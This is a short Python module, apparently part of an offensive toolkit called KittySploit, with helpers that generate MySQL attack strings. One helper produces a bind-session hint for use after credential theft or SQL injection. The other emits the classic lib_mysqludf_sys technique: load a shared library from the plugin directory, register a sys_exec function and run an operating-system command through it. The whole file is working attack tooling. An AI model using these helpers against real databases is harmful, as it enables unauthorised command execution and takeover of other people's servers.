#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""MySQL BIND session helpers (operator connects to target MySQL)."""

from __future__ import annotations


def build_mysql_bind_hint(
    host: str,
    port: int,
    username: str,
    database: str = "",
) -> str:
    db = f" database={database}" if database else ""
    return (
        f"# KittySploit MySQL BIND session\n"
        f"# Framework listener connects to {host}:{port} as {username}{db}\n"
        f"# No reverse agent on target — use after cred discovery or SQLi.\n"
        f"SELECT VERSION();"
    )


def build_mysql_udf_exec_sql(
    plugin_dir: str = "/usr/lib/mysql/plugin",
    udf_name: str = "sys_exec",
) -> str:
    """Classic lib_mysqludf_sys install SQL (requires FILE + plugin dir write)."""
    lib = f"{plugin_dir.rstrip('/')}/lib_mysqludf_sys.so"
    return (
        f"-- Upload {lib} first (requires FILE privilege)\n"
        f"CREATE FUNCTION {udf_name} RETURNS int SONAME 'lib_mysqludf_sys.so';\n"
        f"SELECT {udf_name}('id');"
    )
